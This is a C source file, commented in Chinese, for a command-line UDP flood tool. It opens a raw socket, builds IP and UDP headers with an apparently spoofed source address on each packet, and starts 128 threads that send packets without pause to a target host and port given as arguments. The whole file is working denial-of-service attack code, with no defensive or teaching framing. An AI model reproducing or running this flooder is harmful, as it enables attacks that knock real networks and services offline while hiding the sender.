#include "header/includeall.h"
#include "header/CRC16_check.h"
#include "header/init_header.h"
#include "header/IPs.h"


/* 最多線程數 */
#define MAXCHILD 128

/* 原始套接字 */
int sockfd;

/* 程序活動標誌 */
static int alive = -1;

char dst_ip[20] = { 0 };
int dst_port;


void* attack(void *addr_info){
    struct sockaddr_in *addr = (struct sockaddr_in *)addr_info;
	char buf[100], sendbuf[100];
	int len;
	struct iphdr ip_hdr;			//IP頭部
	struct udphdr udp_hdr;		//UDP頭部
	struct pseudohdr pseudoheader;	//UDP偽頭部


	/* random seed */
	time_t t;
	srand((unsigned) time(&t));

	len = sizeof(struct iphdr) + sizeof(struct udphdr);
	
	/* 初始化頭部 */
	udp_init_header(&ip_hdr, &udp_hdr, &pseudoheader, dst_ip, dst_port);
	/* 處於活動狀態時持續發送包 */
	while(alive){
		ip_hdr.saddr = getSAddr();

		//計算IP校驗和
		bzero(buf, sizeof(buf));
		memcpy(buf , &ip_hdr, sizeof(struct iphdr));
		ip_hdr.check = check_sum((u_short *) buf, sizeof(struct iphdr));

		pseudoheader.saddr = ip_hdr.saddr;

		//計算UDP校驗和
		bzero(buf, sizeof(buf));
		memcpy(buf , &pseudoheader, sizeof(pseudoheader));
		memcpy(buf+sizeof(pseudoheader), &udp_hdr, sizeof(struct udphdr));
		udp_hdr.uh_sum = check_sum((u_short *) buf, sizeof(pseudoheader)+sizeof(struct udphdr));

		bzero(sendbuf, sizeof(sendbuf));
		memcpy(sendbuf, &ip_hdr, sizeof(struct iphdr));
		memcpy(sendbuf+sizeof(struct iphdr), &udp_hdr, sizeof(struct udphdr));
		printf(".");
		if (sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr))< 0){
			perror("sendto()");
			pthread_exit("fail");
		}
		//sleep(1);
	}
}

/* 信號處理函數,設置退出變量alive */
void sig_int(int signo){
	alive = 0;
}

/* 主函數 */
int main(int argc, char *argv[]){
	struct sockaddr_in addr;
	struct hostent * host = NULL;

	int on = 1;
	int i = 0;
	pthread_t pthread[MAXCHILD];
	int err = -1;

	alive = 1;
	/* 截取信號CTRL+C */
	signal(SIGINT, sig_int);

	/* 参數是否數量正鴂 */
	if(argc < 3 || argc > 3){
		printf("usage: udp <IPaddress> <Port>\n");
		exit(1);
	}

	strncpy( dst_ip, argv[1], 16 );
	dst_port = atoi( argv[2] );

	bzero(&addr, sizeof(addr));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(dst_port);

	if(inet_addr(dst_ip) == INADDR_NONE){
		/* 為DNS地址，查詢並轉換成IP地址 */
		host = gethostbyname(argv[1]);
		if(host == NULL){
			perror("gethostbyname()");
			exit(1);
		}
		addr.sin_addr = *((struct in_addr*)(host->h_addr));
		strncpy( dst_ip, inet_ntoa(addr.sin_addr), 16 );
	}
	else
		addr.sin_addr.s_addr = inet_addr(dst_ip);

	if( dst_port < 0 || dst_port > 65535 ){
		printf("Port Error\n");
		exit(1);
	}

	printf("host ip=%s\n", inet_ntoa(addr.sin_addr));

	/* 建立原始socket */
	sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_UDP);	
	if (sockfd < 0){
		perror("socket()");
		exit(1);
	}
	/* 設置IP選項 */
	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof (on)) < 0){
		perror("setsockopt()");
		exit(1);
	}

	/* 將程序的權限修改為普通用户 */
	setuid(getpid());

	/* 建立多个線程協同工作 */
	for(i=0; i<MAXCHILD; i++){
		err = pthread_create(&pthread[i], NULL, attack, (void *)&addr);
		if(err != 0){
			perror("pthread_create()");
			exit(1);
		}
	}

	/* 等待線程结束 */
	for(i=0; i<MAXCHILD; i++){
		err = pthread_join(pthread[i], NULL);
		if(err != 0){
			perror("pthread_join Error\n");
			exit(1);
		}
	}

	close(sockfd);

	return 0;
}